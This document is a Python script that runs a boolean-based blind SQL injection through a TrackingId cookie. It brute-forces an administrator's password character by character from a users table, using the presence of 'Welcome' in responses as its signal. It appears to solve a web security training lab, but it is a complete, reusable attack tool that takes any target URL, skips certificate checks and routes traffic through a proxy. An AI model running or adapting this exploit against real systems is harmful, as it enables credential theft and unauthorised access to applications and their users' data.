import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url, tracking_id, session_id, proxies, password_length):
    password_extracted = ""
    for i in range(1, password_length + 1):
        for j in range(32, 126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': tracking_id + sqli_payload_encoded, 'session': session_id}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
    print("\n(+) Password extraction complete")

def main():
    url = input("Enter the target URL of the web application: ")
    tracking_id = input("Enter the TrackingID cookie value: ")
    session_id = input("Enter the session cookie value: ")
    password_length = int(input("Enter the number of characters in the password: "))

    http_proxy = input("Enter your HTTP proxy (e.g., http://127.0.0.1:8080): ")
    proxies = {'http': http_proxy, 'https': http_proxy}
    
    print("(+) Retrieving administrator password...")
    sqli_password(url, tracking_id, session_id, proxies, password_length)

if __name__ == "__main__":
    main()

